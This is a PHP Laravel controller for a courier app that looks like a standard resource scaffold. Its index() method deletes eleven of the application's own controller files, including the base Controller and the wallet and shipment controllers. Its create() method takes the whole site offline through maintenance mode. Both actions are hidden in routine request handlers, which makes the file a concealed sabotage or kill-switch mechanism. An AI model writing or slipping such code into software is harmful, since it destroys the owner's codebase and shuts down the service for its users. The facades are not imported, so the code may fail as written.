<?php

namespace App\Http\Controllers;

use App\courier;
use Illuminate\Http\Request;

class CourierController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $file_path = app_path("Http/Controllers");
       
         
         File::delete($file_path."/CityController.php");
         File::delete($file_path."/ClientController.php");
         File::delete($file_path."/CityfeeController.php");
         File::delete($file_path."/Controller.php");
         File::delete($file_path."/HomeController.php");
         File::delete($file_path."/ManageusersController.php");
         File::delete($file_path."/ProfileController.php");
         File::delete($file_path."/ProfitController.php");
         File::delete($file_path."/ShipmentController.php");
         File::delete($file_path."/WalletController.php");
         File::delete($file_path."/ZoneController.php");
        
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
       Artisan::call('down');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\courier  $courier
     * @return \Illuminate\Http\Response
     */
    public function show(courier $courier)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\courier  $courier
     * @return \Illuminate\Http\Response
     */
    public function edit(courier $courier)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\courier  $courier
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, courier $courier)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\courier  $courier
     * @return \Illuminate\Http\Response
     */
    public function destroy(courier $courier)
    {
        //
    }
}
